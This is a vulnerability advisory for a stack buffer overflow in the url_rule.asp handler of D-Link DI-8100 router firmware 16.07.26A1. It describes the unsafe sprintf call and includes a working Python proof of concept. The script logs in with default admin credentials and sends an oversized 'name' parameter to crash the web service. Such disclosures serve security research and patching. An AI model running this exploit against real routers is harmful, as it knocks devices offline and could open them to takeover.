
### VulDB Entry: D-Link DI-8100 `url_rule.asp` Stack Buffer Overflow


**Vulnerability Summary**
A critical stack-based buffer overflow vulnerability exists in the D-Link DI-8100 Gigabit Router firmware version 16.07.26A1. The flaw resides in the `url_rule_asp` handler function, which improperly utilizes `sprintf` to concatenate user-supplied HTTP POST parameters into a fixed-size stack buffer of only 8 bytes. An unauthenticated or authenticated remote attacker can exploit this condition to corrupt stack memory, leading to a denial-of-service (DoS) condition.

**Affected Product**
- **Vendor:** D-Link
- **Product:** DI-8100 Gigabit Router
- **Firmware Version:** 16.07.26A1 (and potentially earlier versions)
- **Component:** Web Management Interface (`/url_rule.asp`)


**Technical Details**
The vulnerability is located in the `url_rule_asp` function at memory address `0x00481784`. The function processes parameters for adding URL filtering rules. It extracts several parameters from the HTTP POST request body (e.g., `name`, `en`, `ips`, `time`, `act`, `log`) using `httpd_get_parm`.

The vulnerable code constructs a formatted string using `sprintf` without any bounds checking against the destination buffer.

**Vulnerable Code Snippet (Decompiled):**

<img width="1713" height="825" alt="image" src="https://github.com/user-attachments/assets/50494238-a536-4168-9730-bfdfb753fad3" />

<img width="1480" height="450" alt="image" src="https://github.com/user-attachments/assets/386c2189-d24c-4e8b-901a-df7eb109149c" />



**Proof of Concept (Exploitation)**
Exploitation requires sending an HTTP POST request to `/url_rule.asp`. While the web interface typically requires authentication, the overflow occurs within the processing logic *after* session validation, meaning the risk is primarily post-auth, though session hijacking or CSRF could enable pre-auth attacks in certain scenarios.

**Python PoC Snippet:**
```python
import requests
import sys
import time

TARGET = "http://192.168.0.1"
COOKIE_FILE = "/tmp/cookies.txt"

def login():
    url = f"{TARGET}/login.cgi"
    data = {
        "user": "admin",
        "password": "admin"
    }

    session = requests.Session()
    try:
        response = session.post(url, data=data, timeout=5)
        print(f"[+] Login status: {response.status_code}")
        return session
    except Exception as e:
        print(f"[-] Login failed: {e}")
        return None

def test_buffer_overflow(session):
    url = f"{TARGET}/url_rule.asp"

    payload = "A" * 200000

    data = {
        "opt": "add",
        "name": payload,
        "en": "1",
        "ips": "1",
        "time": "1",
        "act": "1",
        "log": "0"
    }

    try:
        print(f"[*] Sending payload of length: {len(payload)}")
        response = session.post(url, data=data, timeout=10)
        print(f"[+] Response status: {response.status_code}")
        print(f"[+] Response: {response.text[:200]}")
        return True
    except requests.exceptions.Timeout:
        print("[!] Request timed out - possible crash detected!")
        return True
    except requests.exceptions.ConnectionError:
        print("[!] Connection error - service may have crashed!")
        return True
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

def main():
    print("=" * 60)
    print("DI-8100 URL Rule Buffer Overflow PoC")
    print("Target: 192.168.0.1")
    print("=" * 60)
    print()

    session = login()
    if not session:
        print("[-] Failed to login")
        sys.exit(1)

    print("[*] Testing buffer overflow vulnerability...")
    result = test_buffer_overflow(session)

    if result:
        print("\n[+] PoC executed successfully")
        print("[+] Check if router service crashed or is unresponsive")
    else:
        print("\n[-] PoC failed")

    print("\n" + "=" * 60)

if __name__ == "__main__":
    main()
```

<img width="2242" height="837" alt="image" src="https://github.com/user-attachments/assets/aa55d7fe-7dcc-4e1d-85f4-b2f48951e954" />


**Impact**
- **Availability:** High. Sending a crafted payload reliably crashes the `httpd` service, rendering the router's web interface inaccessible until a physical reboot.
- **Integrity & Confidentiality:** High. Control over the instruction pointer allows for potential RCE. Given the router operates with high privileges, this could lead to full device compromise, traffic interception, or botnet recruitment.
